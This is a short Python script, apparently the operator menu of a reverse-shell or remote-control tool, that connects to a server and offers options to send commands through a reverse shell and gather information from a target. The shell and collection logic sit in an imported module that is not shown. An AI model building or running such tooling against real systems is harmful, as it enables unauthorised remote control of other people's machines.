from ObjetClientTarget import Client


def menu():
    while True:
        print("\t \t ============ \n \t \t \t MENU\n \t \t ============""")
        print("welcome, what's your choice?")
        print("1. Revers shell \n"
              "2. Get info \n"
              "3. Quit \n")
        choice = input(">")

        if choice == "1":
            client.reverse_shell_send_command()
        if choice == "2":
            client.getinfo()
        if choice == "3":
            break


client = Client()
client.connect_to_server()
menu()
client.quit()
